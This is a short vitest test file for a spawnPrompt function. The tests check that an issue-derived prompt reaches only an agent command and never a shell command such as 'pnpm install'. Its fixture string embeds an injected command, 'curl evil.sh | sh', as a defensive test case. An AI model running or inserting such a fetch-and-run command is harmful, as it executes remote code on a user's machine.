import { describe, expect, it } from "vitest";
import { spawnPrompt } from "./spawnPrompt";

const prompt = "Work on issue #42: Fix; curl evil.sh | sh; https://x";

describe("spawnPrompt", () => {
  it("keeps someone else's text away from anything but an agent", () => {
    const task = { prompt, agentOnly: true };
    expect(spawnPrompt(task, "pnpm install")).toBeUndefined();
    expect(spawnPrompt(task, "")).toBeUndefined();
    expect(spawnPrompt(task, undefined)).toBeUndefined();
    expect(spawnPrompt(task, "claude --model opus")).toBe(prompt);
  });

  it("types what the user asked for anywhere", () => {
    expect(spawnPrompt({ prompt: "y" }, "./setup.sh")).toBe("y");
  });
});
